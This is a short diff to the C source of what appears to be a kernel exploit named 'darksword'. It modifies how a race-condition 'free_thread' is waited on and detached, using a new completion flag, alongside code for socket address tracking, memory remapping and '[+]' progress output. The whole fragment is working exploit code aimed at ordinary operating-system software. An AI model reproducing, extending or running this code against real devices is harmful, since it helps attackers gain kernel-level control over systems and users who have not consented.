@@ -113,6 +113,7 @@ static int socketCsi = -1;
 static uint64_t gControlSocketAddr = 0, gRwSocketAddr = 0;
 static uint8_t controlData[0x20];
 static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
+static volatile uint8_t freeThreadDone = 0;
 static volatile uint8_t writeRequested = 0, writeDone = 0;
 static volatile mach_vm_address_t freeTarget = 0;
 static volatile mach_vm_size_t freeTargetSize = 0;
@@ -271,6 +272,7 @@ void *free_thread(void *arg) {
             VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
         raceSync = 0;
     }
+    freeThreadDone = 1;
     return NULL;
 }
 
@@ -1535,12 +1537,12 @@ bool run_darksword(void) {
     // longer needs free_thread, so never block on it.
     struct timespec tsJoin = {0, 50 * 1000 * 1000};
     bool joined = false;
-    for (int i = 0; i < 200; i++) {
-        if (pthread_tryjoin_np(freeThread, NULL) == 0) { joined = true; break; }
+    for (int i = 0; i < 200 && !freeThreadDone; i++) {
         nanosleep(&tsJoin, NULL);
     }
+    if (freeThreadDone) joined = true;
     if (!joined) pthread_detach(freeThread);
-    printf("[+] free thread %s\n", joined ? "joined" : "detached");
+    printf("[+] free thread %s\n", joined ? "done" : "detached");
     fflush(stdout);
     close(writeFd); close(readFd);
     printf("[+] race fds closed\n");
